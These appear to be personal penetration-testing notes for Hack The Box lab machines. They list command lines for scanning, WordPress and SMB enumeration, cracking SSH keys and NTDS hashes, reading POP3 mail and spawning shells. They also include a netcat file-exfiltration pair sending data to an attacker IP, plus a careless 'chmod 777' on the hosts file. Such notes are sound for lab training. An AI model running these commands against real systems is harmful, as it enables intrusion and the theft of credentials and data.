Attach hostnames to an ip
  - go to etc/hosts and edit 
    - you will need to run the following on hosts: sudo chmod 777 hosts 
  - add a line with the following format: <IP> (tab) <Hostname> <Hostname>
  
Enumerate a WordPress website
  - wpscan --url https://brainfuck.htb/ --disable-tls-checks
  - wpscan --url https://brainfuck.htb/ --disable-tls-checks --enumerate p --enumerate t --enumerate u

SearchSploit 
  - searchsploit <service name>
    - To grab specific text file: searchsploit -x file.txt
    
To crack an SSH key with John
  - python sshng2john.py id_rsa > ssh_login
  - john ssh_login --wordlist=/usr/share/wordlists/rockyou.txt
    - Then, ssh with the key and the obtained password: ssh -i id_rsa orestis@10.10.10.17

Enumerating SMB: https://infinitelogins.com/2020/06/17/enumerating-smb-for-pentesting/#:~:text=protocol%20negotiation%20failed%3A%20NT_STATUS_CONNECTION_DISCONNECTED%20This%20error%20occurs%20because,to%20use%20the%20weaker%20and%20more%20insecure%20protocols.
	- smbmap -H <IP Address>
	- sudo smbclient \\\\<ip-addr>\\<share>
		- NT_STATUS_CONNECTION_DISCONNECTED:
			- sudo nano /etc/samba/smb.conf
			- Under Global: client min protocol = LANMAN1

nmap
  - Initial Scan: nmap -sC -sV -O -oA initial 10.10.10.13
  - Run the below as you enumerate your initial findings
    - Scan all ports: nmap -sC -sV -O -p- -oA full 10.10.10.13
    - UDP Scan: nmap -sU -O -p- -oA udp 10.10.10.13
    - UDP 1000 ports scan: nmap -sU udep-1000 10.10.10.13 
    - Vuln Scan: nmap--script vuln 10.10.10.13
    
nslookup
  - if port 53 (DNS) is open, ask the DNS server what domain name is associated with a certian IP by running the following
    - nslookup 
    - server <dns ip>
    - <ip in question>

Zone Transfer 
  - host -l <domain name> <DNS IP>
  - Other method: dig axfr @<DNS IP> <domain name>
  
Retreiving emails from an email server
	- nc -nv <IP> 110
	- USER <username>
	- PASS <Password>
	- retr 1
	- retr 2 

Manual SQL Injection: https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/

masscan: sudo masscan -e tun0 -p1-65535 --rate=1000 10.10.10.43

gobuster

  Update: sudo apt update && apt upgrade -y
  Install gobuster: sudo apt-get install gobuster 
  Run it: gobuster dir -u http://10.10.10.43 -w /usr/share/wordlists/Dirbuster/directory-list-2.3-medium.txt -o gobuster/80results.txt 
    To run with https: add -k at the end to ignore certificate and adjust http to https. 
  Run it and look for specific extensions: gobuster dir -u http://10.10.10.43 -w /usr/share/wordlists/Dirbuster/directory-list-2.3-medium.txt -x .php,.html,.txt,.sh

Upgrade Shell
https://github.com/SammyBasri/HackTheBox/blob/main/notes.txt
  - python -c 'import pty;pty.spawn("/bin/bash")'

To find files/folders owned by a user
  - find / -user user 2> /dev/null
  
To switch to a different user while in a Linux shell: su - <username>  

Using Netcat to exfil files 
  - On attacker machine: nc -lnvp 80 > ExfilFile
  - On victim machine: nc <attackers IP> 80 < ExfilFile
  
Getting hashes out of a ntds.dit and ntds.bin
	- bin is the SYSTEM file 
  - impacket-secretsdump -ntds ntds.dit -system <bin file> LOCAL

Enum Notes:

  - Tomcat services usually have a login page at 10.10.10.55/manager/html
  - To check what other devices the victim is communicating with: arp -a 
    - Then check a few ports on the machines found: nc -v <machine address> <port>
  - FTP Anonymous loging: ftp <address>
  	- anonymous/<blank>
  - To create shell as another user: sudo -u <username> /bin/bash



  
    

  
    
    

  

